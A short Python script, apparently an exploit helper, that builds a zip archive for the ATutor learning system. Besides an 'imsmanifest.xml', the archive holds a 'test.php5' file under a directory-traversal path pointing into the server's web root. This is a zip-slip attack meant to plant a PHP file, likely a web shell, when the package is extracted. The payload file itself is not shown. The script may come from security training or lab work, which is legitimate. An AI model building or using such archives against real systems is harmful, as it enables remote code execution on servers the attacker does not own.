# coding: utf-8
import os
import zipfile


# zipfile example
def zip_dir():
    zf = zipfile.ZipFile('test.zip', 'w', zipfile.ZIP_DEFLATED)
    #zf.write(os.path.join('./', 'test.php5'))
    zf.write(os.path.join('./', 'imsmanifest.xml'))
    zf.write(os.path.join('../../../../../../../var/www/html/ATutor/mods/', 'test.php5'))

if __name__ == '__main__':
    zip_dir()